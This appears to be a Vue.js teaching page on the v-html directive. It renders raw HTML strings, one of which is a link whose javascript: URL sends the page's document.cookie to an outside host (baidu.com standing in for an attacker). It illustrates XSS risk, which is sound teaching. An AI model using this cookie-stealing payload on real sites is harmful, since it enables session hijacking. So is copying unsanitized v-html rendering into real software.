<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <script type="text/javascript" src="../../js/vue.js"></script>
    <title>v-html</title>
    </head>
<body>
    <div id="root">
        <div>你好,{{name}}</div>
        <div v-html="str"></div>
        <div v-html="str2"></div>

    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false
        
        new Vue({
            el:'#root', 
            data:{      
                name:'小尚',
                str:'<h3>你好</h3>',
                str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>我找到你的资源了</a>'
            }
        })


    </script>
</body>
</html>
